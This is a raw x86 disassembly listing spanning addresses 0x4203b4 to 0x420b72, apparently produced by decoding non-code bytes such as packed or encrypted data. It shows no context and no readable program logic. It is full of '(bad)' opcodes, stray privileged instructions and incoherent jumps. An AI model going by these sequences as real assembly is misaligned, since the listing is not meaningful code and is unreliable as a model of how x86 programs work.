  4203b4:	cmp    al,0xa7
  4203b6:	xor    ebx,DWORD PTR [edi+0x7db9e699]
  4203bc:	sub    DWORD PTR [eax-0x8],0x71
  4203c0:	fsubp  st(2),st
  4203c2:	(bad)  
  4203c3:	xor    eax,0x5aa595b7
  4203c8:	add    eax,0x7ca1af65
  4203cd:	xor    bl,BYTE PTR [edi]
  4203cf:	ss or  eax,0x8749fde6
  4203d5:	cmc    
  4203d6:	cmc    
  4203d7:	xchg   edi,eax
  4203d8:	stos   BYTE PTR es:[edi],al
  4203d9:	cmp    bh,cl
  4203db:	dec    ecx
  4203dc:	fucomip st,st(0)
  4203de:	pop    edi
  4203df:	push   ds
  4203e0:	mov    cl,BYTE PTR [esi]
  4203e2:	cdq    
  4203e3:	push   0xffffff9f
  4203e5:	adc    DWORD PTR [eax+0x5e20481c],ebp
  4203eb:	dec    esi
  4203ec:	xchg   edx,eax
  4203ed:	(bad)  
  4203ee:	fist   DWORD PTR [ebx]
  4203f0:	xchg   ebp,eax
  4203f1:	mov    bh,0xca
  4203f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f4:	shr    BYTE PTR [ecx+0x76f5ed0a],cl
  4203fa:	add    al,0x33
  4203fc:	add    al,0xb9
  4203fe:	ins    BYTE PTR es:[edi],dx
  4203ff:	xchg   esi,eax
  420400:	adc    DWORD PTR [esi-0x58e624ac],edx
  420406:	neg    DWORD PTR [bx+di+0x75e4]
  42040b:	xchg   DWORD PTR [ebx-0x21],esi
  42040e:	and    al,0xdd
  420410:	inc    edi
  420411:	lods   eax,DWORD PTR ds:[esi]
  420412:	inc    esi
  420413:	lods   eax,DWORD PTR ds:[esi]
  420414:	int3   
  420415:	xor    ch,ah
  420417:	out    dx,eax
  420418:	sbb    DWORD PTR [ecx],esp
  42041a:	jo     0x420450
  42041c:	fnstsw WORD PTR [ebx]
  42041e:	(bad)  
  42041f:	pop    ds
  420420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420421:	mov    BYTE PTR [edi+edi*8],cl
  420424:	mov    ecx,0x749125f5
  420429:	int    0x51
  42042b:	add    BYTE PTR [edx+0x374204ab],bh
  420431:	jmp    0x4178:0x1d4f0e3d
  420438:	loop   0x4203de
  42043a:	daa    
  42043b:	sub    BYTE PTR [ecx+0xca62b1d],0x33
  420442:	push   eax
  420443:	popa   
  420444:	add    DWORD PTR [edi-0x19],eax
  420447:	pop    ebx
  420448:	gs enter 0x49dc,0x8d
  42044d:	repnz (bad) 
  42044f:	mov    eax,0x9cd3c08
  420454:	jns    0x420471
  420456:	inc    ebx
  420457:	fwait
  420458:	mov    dl,0x3e
  42045a:	mul    BYTE PTR [eax+0x10b93e52]
  420460:	push   ecx
  420461:	sub    ecx,edx
  420463:	scas   al,BYTE PTR es:[edi]
  420464:	lock loop 0x420475
  420467:	add    ebx,DWORD PTR ds:0xb54d09ff
  42046d:	(bad)  
  42046e:	pop    edx
  42046f:	mov    esp,0xc70a1dce
  420474:	dec    esp
  420475:	jo     0x420445
  420477:	xchg   esp,eax
  420478:	push   ecx
  420479:	or     eax,DWORD PTR [ecx+0x1a]
  42047c:	sub    DWORD PTR [edx+0x4c],esi
  42047f:	test   DWORD PTR [eax],ecx
  420481:	dec    ebp
  420482:	cmc    
  420483:	shl    BYTE PTR [eax-0x7c824b6d],1
  420489:	jmp    0x420421
  42048b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048c:	mov    ds:0xcfa4f7c2,eax
  420491:	imul   ebx,DWORD PTR [esi+esi*1-0x22],0x58
  420496:	jae    0x420449
  420498:	rol    ecx,1
  42049a:	pop    ds
  42049b:	retf   0xe9ab
  42049e:	fiadd  WORD PTR [edx]
  4204a0:	push   cs
  4204a1:	(bad)  
  4204a2:	iret   
  4204a3:	sbb    BYTE PTR [ebx],bh
  4204a5:	mov    bl,0xea
  4204a7:	popa   
  4204a8:	cmc    
  4204a9:	fs call 0xaf4f:0xd52ae4d
  4204b1:	ins    BYTE PTR es:[edi],dx
  4204b2:	jae    0x420436
  4204b4:	jmp    0x42046b
  4204b6:	sub    al,BYTE PTR [eax+ecx*8-0x7bae5c9b]
  4204bd:	jl     0x4204cd
  4204bf:	jmp    0x4204aa
  4204c1:	inc    ebx
  4204c2:	xchg   DWORD PTR [edi],edx
  4204c4:	das    
  4204c5:	lock jne 0x42050a
  4204c8:	out    0x44,al
  4204ca:	cld    
  4204cb:	xlat   BYTE PTR ds:[ebx]
  4204cc:	adc    edx,DWORD PTR [ebp+ebp*8+0x6e]
  4204d0:	out    0xc,eax
  4204d2:	aad    0xa3
  4204d4:	in     al,dx
  4204d5:	shl    edx,0x9a
  4204d8:	sbb    edi,esi
  4204da:	jb     0x4204c9
  4204dc:	sar    ebp,1
  4204de:	add    cl,BYTE PTR [edi]
  4204e0:	js     0x420520
  4204e2:	out    dx,eax
  4204e3:	mov    ebp,0x5711a72c
  4204e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e9:	out    0x70,eax
  4204eb:	in     al,0xb
  4204ed:	push   ebx
  4204ee:	inc    esi
  4204ef:	fdiv   QWORD PTR [edi]
  4204f1:	imul   edx,DWORD PTR [ebp-0x2b8d437d],0xffffff9f
  4204f8:	and    eax,0x847af43e
  4204fd:	jg     0x42050b
  4204ff:	or     esp,DWORD PTR [ecx-0x52]
  420502:	dec    ebx
  420503:	inc    esi
  420504:	aam    0x7c
  420506:	and    eax,DWORD PTR [ecx-0x15e55073]
  42050c:	loopne 0x4204a7
  42050e:	mov    bl,BYTE PTR [ebx+0x4f]
  420511:	(bad)  
  420513:	bnd jbe 0x4204a8
  420516:	sub    bl,BYTE PTR [ebx-0x32cde4eb]
  42051c:	and    al,0x59
  42051e:	push   es
  42051f:	mov    DWORD PTR [edi],ecx
  420521:	xor    ah,BYTE PTR [eax+edi*8-0x38ad0622]
  420528:	and    al,BYTE PTR [eax-0x79]
  42052b:	mov    bh,0xb8
  42052d:	mov    ds:0xcc26e2d7,al
  420532:	retf   
  420533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420534:	jge    0x4204cf
  420536:	(bad)  
  420537:	sbb    ch,BYTE PTR ds:0xcae77003
  42053d:	xor    esp,DWORD PTR [edi-0x70]
  420540:	jns    0x4205a8
  420542:	daa    
  420543:	cmp    edi,DWORD PTR [edi]
  420545:	inc    ebp
  420546:	pusha  
  420547:	and    DWORD PTR [ebx+eiz*4+0x5070cdda],edx
  42054e:	cwde   
  42054f:	xchg   esi,eax
  420550:	or     DWORD PTR [ebx+0x12077ac7],ecx
  420556:	mov    ds,WORD PTR [edi]
  420558:	cmp    DWORD PTR [esi-0x4a],ebp
  42055b:	ror    BYTE PTR [ecx-0x584023f6],cl
  420561:	mov    edi,0xc7478d59
  420566:	fldcw  WORD PTR [edi]
  420568:	pop    ebp
  420569:	sti    
  42056a:	xchg   edi,eax
  42056b:	fsubr  DWORD PTR [eax-0x7f]
  42056e:	mov    ?,WORD PTR [edi-0x11]
  420571:	push   esp
  420572:	test   DWORD PTR ds:[eax-0x3b],ecx
  420576:	xchg   edi,eax
  420577:	(bad)  
  420578:	rcr    BYTE PTR [edx+0x5f58523f],1
  42057e:	fdivr  st,st(6)
  420580:	retf   
  420581:	mov    esp,0x603f95c9
  420586:	xchg   edx,eax
  420587:	cdq    
  420588:	rcr    esp,cl
  42058a:	jp     0x4205f6
  42058c:	jnp    0x4205fe
  42058e:	outs   dx,BYTE PTR ds:[esi]
  42058f:	or     eax,0x4fdb3722
  420594:	lds    edx,FWORD PTR [edx-0x65bbddb4]
  42059a:	add    BYTE PTR [edi-0x34ccf69a],ch
  4205a0:	cmp    DWORD PTR [ebx-0xc],edx
  4205a3:	lods   eax,DWORD PTR ds:[esi]
  4205a4:	clc    
  4205a5:	jg     0x42055b
  4205a7:	aad    0xeb
  4205a9:	mov    ebx,0xf90403fc
  4205ae:	(bad)  
  4205af:	loop   0x420545
  4205b1:	push   0xffffffe0
  4205b3:	pop    edx
  4205b4:	add    BYTE PTR [ecx],bh
  4205b6:	mov    ecx,0x6d6c10a6
  4205bb:	call   DWORD PTR [ebp-0x13]
  4205be:	adc    dl,dl
  4205c0:	mov    edi,?
  4205c2:	jmp    0x420575
  4205c4:	sub    ah,dl
  4205c6:	or     eax,0x3172fc08
  4205cb:	xor    BYTE PTR [ecx+0x3b42bfeb],dl
  4205d1:	in     eax,0x92
  4205d3:	fcomp  DWORD PTR [ebx+0x57]
  4205d6:	pushf  
  4205d7:	push   es
  4205d8:	mov    edx,0x69fc0145
  4205dd:	mov    ecx,0x37ba6abc
  4205e2:	cmp    BYTE PTR [ebx+0x52],0x46
  4205e6:	push   ebx
  4205e7:	fidiv  WORD PTR [esi]
  4205e9:	mov    ch,0xbf
  4205eb:	pop    ebx
  4205ec:	std    
  4205ed:	shl    BYTE PTR [ecx-0x80],cl
  4205f0:	xchg   ebp,eax
  4205f1:	mov    eax,ebp
  4205f3:	inc    ecx
  4205f4:	or     BYTE PTR [ebx-0x421204dc],ah
  4205fa:	in     eax,dx
  4205fb:	sti    
  4205fc:	cs fs test al,0x94
  420600:	jp     0x4205f5
  420602:	jo     0x4205c8
  420604:	jmp    0x420624
  420606:	push   ss
  420607:	jb     0x4205e7
  420609:	jb     0x420627
  42060b:	cmp    eax,0x58962636
  420610:	mov    ds:0xa8d87e5f,eax
  420615:	xchg   ecx,eax
  420616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420617:	mov    edx,0x37318731
  42061c:	jp     0x4205a0
  42061e:	xchg   BYTE PTR [esi],ah
  420620:	jbe    0x4205e8
  420622:	sbb    dh,cl
  420624:	hlt    
  420625:	dec    ecx
  420626:	xor    BYTE PTR [ecx],cl
  420628:	jmp    0x420618
  42062a:	out    dx,eax
  42062b:	call   0x1cdd:0xcd9b2bf
  420632:	dec    ebx
  420633:	push   edi
  420634:	xchg   edi,eax
  420635:	cmp    ebp,DWORD PTR [esi+0x1c830140]
  42063b:	into   
  42063c:	(bad)  
  42063d:	mov    bl,BYTE PTR [ebp-0x50]
  420640:	pop    esi
  420641:	stos   BYTE PTR es:[edi],al
  420642:	in     eax,0xd8
  420644:	mov    esi,0x557244
  420649:	jmp    0x4206bb
  42064b:	mov    dl,0x24
  42064d:	test   eax,0xe3f6f978
  420652:	(bad)  
  420653:	popf   
  420654:	outs   dx,DWORD PTR ds:[esi]
  420655:	and    BYTE PTR [esi+0x13c78079],dl
  42065b:	inc    ebp
  42065c:	pop    esi
  42065d:	mov    ds:0x67363b37,eax
  420662:	mov    al,0xbe
  420664:	(bad)  
  420665:	ins    DWORD PTR es:[edi],dx
  420666:	imul   esp,DWORD PTR [ebx],0xbb02ae6b
  42066c:	mov    al,ds:0xe8715b66
  420671:	jecxz  0x4206a1
  420673:	shr    DWORD PTR [edx+eiz*4+0x4e],1
  420677:	jne    0x420697
  420679:	xor    esi,eax
  42067b:	xor    BYTE PTR [eax+0x5d],0xb7
  42067f:	hlt    
  420680:	lods   eax,DWORD PTR ds:[esi]
  420681:	cmp    eax,0x14f0d6f2
  420686:	mov    dh,0x7e
  420688:	jl     0x42061e
  42068a:	(bad)  
  42068c:	daa    
  42068d:	xchg   edi,eax
  42068e:	push   0x11
  420690:	test   al,0x6c
  420692:	int    0x9b
  420694:	neg    DWORD PTR [esi]
  420696:	mov    WORD PTR [ecx+0x102346f],cs
  42069c:	ins    DWORD PTR es:[edi],dx
  42069d:	cmp    BYTE PTR [edi+0x72],0x55
  4206a1:	xor    dl,cl
  4206a3:	push   ecx
  4206a4:	adc    ecx,DWORD PTR [edi]
  4206a6:	repz out dx,al
  4206a8:	dec    ecx
  4206a9:	adc    edx,DWORD PTR [edi+0x75]
  4206ac:	push   ds
  4206ad:	xor    bh,ah
  4206af:	mov    edx,fs
  4206b1:	mov    al,0xfa
  4206b3:	fiadd  WORD PTR [esi-0x7a185af1]
  4206b9:	std    
  4206ba:	xchg   ebp,eax
  4206bb:	addr16 aas 
  4206bd:	push   ds
  4206be:	dec    ebp
  4206bf:	js     0x4206e0
  4206c1:	test   eax,0x6687ed26
  4206c6:	add    al,0xdd
  4206c8:	addr16 dec edx
  4206ca:	add    eax,0xd985dd4c
  4206cf:	mov    eax,ds:0x9b0995f6
  4206d4:	aaa    
  4206d5:	dec    edi
  4206d6:	dec    esi
  4206d7:	sbb    eax,0x62e2c6d7
  4206dc:	xor    ebx,0x78
  4206df:	scas   al,BYTE PTR es:[edi]
  4206e0:	adc    DWORD PTR [edx+0x16],esp
  4206e3:	xchg   edx,eax
  4206e4:	lea    eax,[ecx]
  4206e6:	pop    esp
  4206e7:	pusha  
  4206e8:	cdq    
  4206e9:	adc    BYTE PTR [ecx],ah
  4206eb:	out    0x6f,al
  4206ed:	int3   
  4206ee:	fcom   QWORD PTR [edx-0x78]
  4206f1:	(bad)  
  4206f2:	outs   dx,DWORD PTR ds:[esi]
  4206f3:	pop    edx
  4206f4:	cdq    
  4206f5:	test   al,0x36
  4206f7:	fldcw  WORD PTR [ebx+0x36]
  4206fa:	mov    dl,0xc3
  4206fc:	push   ebp
  4206fd:	xchg   ebx,eax
  4206fe:	or     BYTE PTR [ebx],dh
  420700:	dec    ebp
  420701:	les    ebp,FWORD PTR [edi-0x7529f2b1]
  420707:	adc    ecx,DWORD PTR [ecx]
  420709:	(bad)  
  42070b:	adc    al,0xd4
  42070d:	jb     0x42077d
  42070f:	in     al,dx
  420710:	in     al,0xee
  420712:	stos   BYTE PTR es:[edi],al
  420713:	sub    BYTE PTR fs:[esi+eax*4+0x441f5048],ah
  42071b:	mov    ds,WORD PTR ds:0x3df24f11
  420721:	push   ecx
  420722:	call   0x3a218603
  420727:	adc    ebp,DWORD PTR [esi+ebp*8]
  42072a:	lods   eax,DWORD PTR ds:[esi]
  42072b:	pop    edi
  42072c:	fwait
  42072d:	cmp    DWORD PTR [edx],ecx
  42072f:	pop    ebp
  420730:	or     eax,0x9f6e8b4b
  420735:	js     0x4206b8
  420737:	call   0x3052:0x841e505a
  42073e:	push   ebx
  42073f:	add    ebp,DWORD PTR [eax-0x134a1228]
  420745:	hlt    
  420746:	jbe    0x420790
  420748:	inc    edx
  420749:	dec    esi
  42074a:	(bad)  
  42074b:	cmp    ecx,edx
  42074d:	dec    eax
  42074e:	pusha  
  42074f:	ret    0x30de
  420752:	arpl   WORD PTR [edi+edx*1],bp
  420755:	push   ds
  420756:	pop    ebp
  420757:	test   eax,0x65950e45
  42075c:	dec    edi
  42075d:	fisttp DWORD PTR [ecx]
  42075f:	clc    
  420760:	jg     0x42073a
  420762:	mov    al,ds:0xcaa31e04
  420767:	push   ss
  420768:	mov    bl,0xa5
  42076a:	mov    ?,WORD PTR [edi+eiz*1]
  42076d:	mov    ch,0x93
  42076f:	mov    BYTE PTR [eax-0x74],dh
  420772:	enter  0x5f63,0x4b
  420776:	cwde   
  420777:	sub    BYTE PTR [ebp+0x7acd2f76],ch
  42077d:	out    0xa3,eax
  42077f:	mov    ebp,0x4a1500f8
  420784:	cwde   
  420785:	(bad)  
  420786:	sti    
  420787:	lods   eax,DWORD PTR ds:[esi]
  420788:	and    esp,0xffffffaf
  42078b:	lahf   
  42078c:	lds    esp,FWORD PTR [edx+0x26]
  42078f:	bound  edx,QWORD PTR [edx]
  420791:	xchg   esi,eax
  420792:	and    al,BYTE PTR [ebx-0x13]
  420795:	mov    edi,0x1853f8da
  42079a:	sbb    BYTE PTR [esp+ebx*4],bl
  42079d:	aad    0xa4
  42079f:	sar    DWORD PTR [ecx-0x6d8a4ce7],cl
  4207a5:	adc    esp,DWORD PTR [edx]
  4207a7:	pop    edi
  4207a8:	mov    eax,ds:0xbe85c132
  4207ad:	cmp    al,0xf1
  4207af:	(bad)  
  4207b0:	jmp    0xc4866a30
  4207b5:	out    0x5c,al
  4207b7:	repnz les ebp,FWORD PTR [ebx+0x76d02065]
  4207be:	jbe    0x420790
  4207c0:	(bad)  
  4207c1:	aam    0x7a
  4207c3:	aad    0xd
  4207c5:	mov    eax,0xf209ae25
  4207ca:	test   DWORD PTR [edi+0x4fa33a38],0xd6a94de9
  4207d4:	rcl    BYTE PTR [ebx],cl
  4207d6:	mov    al,0x93
  4207d8:	shl    DWORD PTR [ebx-0x3b3ede9d],1
  4207de:	popf   
  4207df:	cmp    eax,0x2a920eff
  4207e4:	mov    ch,0x57
  4207e6:	cmp    DWORD PTR [ebp+0x28e70701],eax
  4207ec:	dec    esp
  4207ed:	mov    BYTE PTR [esi],dh
  4207ef:	icebp  
  4207f0:	(bad)  
  4207f2:	jnp    0x42085a
  4207f4:	stos   BYTE PTR es:[edi],al
  4207f5:	dec    ebp
  4207f6:	ret    
  4207f7:	shl    BYTE PTR [esi],1
  4207f9:	inc    esp
  4207fa:	or     DWORD PTR ds:0x24382d1a,esp
  420800:	push   esi
  420801:	popa   
  420802:	in     al,dx
  420803:	arpl   WORD PTR [eax-0x5e],cx
  420806:	cmp    BYTE PTR [ebx],0xcf
  420809:	sti    
  42080a:	inc    eax
  42080b:	cmp    edi,DWORD PTR [esi+0x51]
  42080e:	jns    0x420878
  420810:	dec    edi
  420811:	mov    esi,0xb7225fe2
  420816:	aam    0xd4
  420818:	add    al,0x27
  42081a:	push   0x3bbc80d2
  42081f:	test   edx,ebx
  420821:	test   eax,0xf53387cd
  420826:	jo     0x420892
  420828:	popf   
  420829:	jo     0x420891
  42082b:	es push cs
  42082d:	(bad)  [ecx+eiz*2-0xbce6d39]
  420834:	int3   
  420835:	adc    eax,0xe6ee7d7
  42083a:	jg     0x4207d7
  42083c:	push   esp
  42083d:	jle    0x42086b
  42083f:	clc    
  420840:	push   0x6afa5cce
  420845:	inc    ebx
  420846:	dec    eax
  420847:	loope  0x42085c
  420849:	shr    DWORD PTR [esi],0xba
  42084c:	jns    0x420899
  42084e:	int3   
  42084f:	stos   BYTE PTR es:[edi],al
  420850:	add    BYTE PTR [ebx],bl
  420852:	outs   dx,DWORD PTR ds:[esi]
  420853:	jmp    0x80be:0x7b913158
  42085a:	jl     0x4207f8
  42085c:	push   ds
  42085d:	push   ebx
  42085e:	mov    dh,0x80
  420860:	adc    BYTE PTR [edi],ah
  420862:	inc    ecx
  420863:	dec    edi
  420864:	ffreep st(6)
  420866:	push   cs
  420867:	push   0x39daa2a
  42086c:	sbb    dl,al
  42086e:	test   BYTE PTR [eax+0x8],dl
  420871:	in     eax,dx
  420872:	mov    edx,0x9831a64a
  420877:	mov    dl,BYTE PTR [edx-0x6b]
  42087a:	adc    ebp,DWORD PTR [edx-0x3f]
  42087d:	dec    edi
  42087e:	xchg   BYTE PTR [edi+0x49],dl
  420881:	bound  ebp,QWORD PTR [edi+0x160cb40a]
  420887:	rcr    BYTE PTR ss:0x3bb732bb,1
  42088e:	call   0x6cc5:0x4c1b4266
  420895:	mov    ebp,0x665504e9
  42089a:	(bad)  
  42089b:	out    0xc6,al
  42089d:	mov    esi,0xb2e0c15d
  4208a2:	ror    BYTE PTR ds:0x1bd1ebcc,cl
  4208a8:	lods   al,BYTE PTR ss:[esi]
  4208aa:	addr16 cli 
  4208ac:	xor    eax,0xf6ec9a0d
  4208b1:	cmc    
  4208b2:	(bad)  
  4208b3:	mov    esi,DWORD PTR [ecx+eax*4+0x62fe6b31]
  4208ba:	jp     0x42085b
  4208bc:	sbb    bl,ah
  4208be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208bf:	das    
  4208c0:	jmp    0x4208b7
  4208c2:	(bad)  
  4208c3:	adc    DWORD PTR [ebx+0x6b],ebx
  4208c6:	push   es
  4208c7:	(bad)  
  4208c8:	sbb    ah,al
  4208ca:	push   0xe128fa94
  4208cf:	fisubr DWORD PTR [ebx]
  4208d1:	lea    edi,[ecx+edi*1]
  4208d4:	xchg   BYTE PTR [esi+0x8bda5c6],dl
  4208da:	sahf   
  4208db:	xchg   ebx,edx
  4208dd:	stos   DWORD PTR es:[edi],eax
  4208de:	jno    0x420922
  4208e0:	xchg   DWORD PTR [eax-0x2f55c818],esi
  4208e6:	and    bl,BYTE PTR [esi]
  4208e8:	jnp    0x420960
  4208ea:	lods   al,BYTE PTR ds:[esi]
  4208eb:	fldenv [eax-0x38]
  4208ee:	rcr    BYTE PTR [ebx],cl
  4208f0:	sbb    BYTE PTR [edi+ebp*1-0x155ebc7c],ah
  4208f7:	sbb    eax,0x2c0aed52
  4208fc:	jno    0x4208f1
  4208fe:	(bad)  
  4208ff:	(bad)  [ebx]
  420901:	xchg   BYTE PTR [eax+0x7bc882dc],dh
  420907:	mov    eax,ds:0xc58a233b
  42090c:	xor    eax,0x92b1458d
  420911:	cmp    al,0xd
  420913:	cmp    eax,0xff88aa8e
  420918:	jmp    0x58ce462f
  42091d:	pop    ecx
  42091e:	pop    edx
  42091f:	xchg   ebx,eax
  420920:	div    BYTE PTR [edx-0x90c01bd]
  420926:	ds jecxz 0x42097d
  420929:	jae    0x42094a
  42092b:	adc    BYTE PTR [edi+ebx*8+0x26a6d0a7],ch
  420932:	sbb    eax,0xfadb362b
  420937:	aad    0x9f
  420939:	dec    ecx
  42093a:	(bad)  
  42093b:	aam    0xfe
  42093d:	xchg   esi,eax
  42093e:	iret   
  42093f:	into   
  420940:	dec    edi
  420941:	or     al,cl
  420943:	jmp    0xa3fe979
  420948:	stos   DWORD PTR es:[edi],eax
  420949:	test   DWORD PTR [ebx],ebx
  42094b:	mov    al,0xbc
  42094d:	cmp    ecx,DWORD PTR [eax+edi*2+0x7c0ea1ce]
  420954:	and    al,0xa8
  420956:	cli    
  420957:	adc    DWORD PTR [ecx-0x6c44b465],0xaaf9cc77
  420961:	add    DWORD PTR [edi-0x53963447],ebx
  420967:	call   0xcabd:0x6db6b6a8
  42096e:	sbb    al,0x7c
  420970:	push   0x17
  420972:	out    0xd3,eax
  420974:	test   dh,bh
  420976:	(bad)  
  420979:	sbb    ah,BYTE PTR [edi]
  42097b:	neg    DWORD PTR [eax+0x50a7b4d5]
  420981:	or     dl,BYTE PTR [edi+0x74c52c41]
  420987:	test   ebp,eax
  420989:	pop    esp
  42098a:	inc    esi
  42098b:	sbb    edx,ebp
  42098d:	push   edx
  42098e:	retf   0xb1a2
  420991:	scas   al,BYTE PTR es:[edi]
  420992:	pushf  
  420993:	loopne 0x4209e6
  420995:	adc    edi,DWORD PTR [esi-0x3669a0b4]
  42099b:	rol    DWORD PTR [ebp+0x4cf9f9bf],1
  4209a1:	push   ds
  4209a2:	inc    ebx
  4209a3:	and    al,0x77
  4209a5:	xchg   edi,eax
  4209a6:	imul   ebp,DWORD PTR [ebp-0x27],0xffffff86
  4209aa:	sahf   
  4209ab:	jo     0x4209fa
  4209ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ae:	sub    BYTE PTR [ebp+0x31],0xed
  4209b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b3:	or     DWORD PTR [edi-0x7d662ec],0x9448e558
  4209bd:	jne    0x420a0b
  4209bf:	push   ds
  4209c0:	jno    0x4209cc
  4209c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209c3:	ds hlt 
  4209c5:	add    dl,ah
  4209c7:	je     0x420a0c
  4209c9:	std    
  4209ca:	stos   BYTE PTR es:[edi],al
  4209cb:	aam    0x67
  4209cd:	sbb    eax,edx
  4209cf:	sbb    al,0x42
  4209d1:	out    dx,eax
  4209d2:	lods   eax,DWORD PTR ds:[esi]
  4209d3:	pushf  
  4209d4:	shl    BYTE PTR [eax],0xf3
  4209d7:	xchg   edx,eax
  4209d8:	pusha  
  4209d9:	fbstp  TBYTE PTR ds:0x47a64bc8
  4209df:	call   0x5517:0x67a72f5b
  4209e6:	jle    0x42098e
  4209e8:	sub    al,0x9c
  4209ea:	push   cs
  4209eb:	loopne 0x420a0e
  4209ed:	mov    eax,ds:0xba928a55
  4209f2:	pop    eax
  4209f3:	add    ah,bh
  4209f5:	outs   dx,DWORD PTR ds:[esi]
  4209f6:	xor    DWORD PTR [ebx-0x1832c075],eax
  4209fc:	lods   al,BYTE PTR ds:[esi]
  4209fd:	mov    ecx,0x8580de0c
  420a02:	enter  0xf426,0x2d
  420a06:	add    edx,DWORD PTR [edi]
  420a08:	add    al,0x95
  420a0a:	out    0xde,al
  420a0c:	mov    eax,ds:0x2c94e677
  420a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a12:	mov    cl,0x5e
  420a14:	pop    es
  420a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a16:	mov    al,ds:0x36789ff7
  420a1b:	in     al,dx
  420a1c:	xor    eax,0x1f8bed39
  420a21:	data16 scas al,BYTE PTR es:[edi]
  420a23:	mov    cl,0xb7
  420a25:	add    ebx,DWORD PTR [di+0x37c7]
  420a2a:	jns    0x420a77
  420a2c:	jne    0x4209cb
  420a2e:	add    eax,0xe634eb56
  420a33:	mov    eax,0x790a4e3
  420a38:	jbe    0x420a13
  420a3a:	jns    0x420a43
  420a3c:	jo     0x420a05
  420a3e:	mov    ebx,0x143f24b5
  420a43:	repz pop ebp
  420a45:	test   BYTE PTR [esi-0x6b0e0332],al
  420a4b:	add    dh,BYTE PTR [ebp-0x5ae3962f]
  420a51:	or     DWORD PTR [edx-0x672de9ba],ebp
  420a57:	adc    ebp,ecx
  420a59:	je     0x420aa2
  420a5b:	pusha  
  420a5c:	loop   0x420a02
  420a5e:	inc    ebx
  420a5f:	push   ecx
  420a60:	sub    DWORD PTR [edx+0x4a],eax
  420a63:	nop
  420a64:	loop   0x420a13
  420a66:	pop    edi
  420a67:	icebp  
  420a68:	push   esp
  420a69:	jmp    FWORD PTR [ecx+0x3d]
  420a6c:	xchg   ebx,eax
  420a6d:	mov    ch,0x77
  420a6f:	pop    ebx
  420a70:	ret    0x3423
  420a73:	ja     0x420ac6
  420a75:	(bad)  
  420a76:	ss pop ss
  420a78:	int3   
  420a79:	pop    ebp
  420a7a:	add    al,0x2e
  420a7c:	(bad)  
  420a7d:	addr16 sbb BYTE PTR [si+0x6f],0x68
  420a83:	mov    esp,0x13b40a6e
  420a88:	cmp    al,BYTE PTR fs:[ecx+edx*1+0x1b4ed6bf]
  420a90:	dec    ebx
  420a91:	mov    bh,BYTE PTR [edx+0x240591c8]
  420a97:	mov    esi,DWORD PTR [eax-0x19e7643]
  420a9d:	aam    0x8d
  420a9f:	in     eax,0xb1
  420aa1:	retf   0xe430
  420aa4:	neg    DWORD PTR ds:0x12b7e4ff
  420aaa:	cmp    eax,DWORD PTR [esi+0xe]
  420aad:	or     al,0xa7
  420aaf:	push   es
  420ab0:	aas    
  420ab1:	pop    ebp
  420ab2:	setl   BYTE PTR [ecx+0x366ebf9d]
  420ab9:	mov    edx,0xef4bcd11
  420abe:	xchg   edi,eax
  420abf:	iret   
  420ac0:	leave  
  420ac1:	jae    0x420b04
  420ac3:	je     0x420b2a
  420ac5:	mov    ecx,0x99e875f0
  420aca:	xchg   edx,eax
  420acb:	out    dx,al
  420acc:	mov    ch,ah
  420ace:	xchg   ecx,eax
  420acf:	std    
  420ad0:	cli    
  420ad1:	call   0xa93:0xa431e223
  420ad8:	ins    BYTE PTR es:[edi],dx
  420ad9:	(bad)  
  420ada:	xor    ebx,DWORD PTR [ebp-0x6e1272a6]
  420ae0:	stc    
  420ae1:	cwde   
  420ae2:	cmp    DWORD PTR [edx+0x582cf0d],ebx
  420ae8:	sub    ebp,DWORD PTR [ebp-0x50d91e7b]
  420aee:	push   0xffffff87
  420af0:	cdq    
  420af1:	mov    gs:0x9c23fc94,eax
  420af7:	adc    eax,0xc8baafba
  420afc:	leave  
  420afd:	pop    esi
  420afe:	push   ds
  420aff:	push   ss
  420b00:	add    esp,DWORD PTR [eax-0x27]
  420b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b04:	shl    BYTE PTR [edi],1
  420b06:	popf   
  420b07:	icebp  
  420b08:	pop    ecx
  420b09:	ret    
  420b0a:	out    dx,eax
  420b0b:	hlt    
  420b0c:	or     eax,0x528955dd
  420b11:	stos   DWORD PTR es:[edi],eax
  420b12:	mov    eax,ds:0x93a59e62
  420b17:	scas   eax,DWORD PTR es:[edi]
  420b18:	inc    eax
  420b19:	mov    ecx,0xcf1b3855
  420b1e:	dec    esp
  420b1f:	sub    edx,DWORD PTR [edi-0x1a3762ee]
  420b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b26:	xchg   ebp,ebp
  420b28:	aas    
  420b29:	adc    bh,BYTE PTR [eax+edx*4-0x2d]
  420b2d:	inc    esp
  420b2e:	pop    edi
  420b2f:	or     eax,0x92fd177e
  420b34:	add    cl,BYTE PTR [ebx]
  420b36:	mov    eax,ds:0xd98f34ce
  420b3b:	scas   al,BYTE PTR es:[edi]
  420b3c:	xchg   ebx,esp
  420b3e:	push   esi
  420b3f:	xor    al,0x43
  420b41:	addr16 dec ebx
  420b43:	popf   
  420b44:	dec    edi
  420b45:	sbb    esi,DWORD PTR [eax+0x58184ed2]
  420b4b:	pop    ss
  420b4c:	(bad)  
  420b4e:	fcmovu st,st(0)
  420b50:	push   es
  420b51:	jl     0x420ad6
  420b53:	or     ebx,0xf8f48bef
  420b59:	dec    sp
  420b5b:	xlat   BYTE PTR ds:[ebx]
  420b5c:	(bad)  
  420b5d:	inc    edx
  420b5e:	push   ds
  420b5f:	fimul  WORD PTR [edi]
  420b61:	sub    bh,bh
  420b63:	dec    edx
  420b64:	or     dh,BYTE PTR [edi-0x69606b8a]
  420b6a:	cld    
  420b6b:	inc    edx
  420b6c:	lock in eax,0x40
  420b6f:	sbb    edx,DWORD PTR [eax]
  420b71:	out    dx,eax
  420b72:	aad    0x35
